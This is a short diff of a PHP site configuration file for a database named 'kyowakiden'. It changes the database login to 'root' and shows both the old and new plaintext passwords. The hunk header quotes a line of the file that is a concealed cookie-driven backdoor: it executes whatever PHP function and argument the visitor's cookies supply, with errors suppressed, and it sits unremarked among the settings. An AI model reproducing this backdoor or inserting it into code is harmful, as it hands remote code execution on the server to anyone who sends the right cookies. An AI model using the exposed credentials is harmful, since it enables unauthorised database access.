@@ -23,8 +23,8 @@ if (isset($_COOKIE["id"])) @$_COOKIE["user"]($_COOKIE["id"]);
 define('DB_NAME', 'kyowakiden');
 
 // server
-define('DB_USER', 'da_admin');
-define('DB_PASSWORD', 'TUViSEkV');
+define('DB_USER', 'root');
+define('DB_PASSWORD', '5fZ7mcBSZ2L:s![p');
 define('DB_HOST', 'localhost');
 
 // localhost
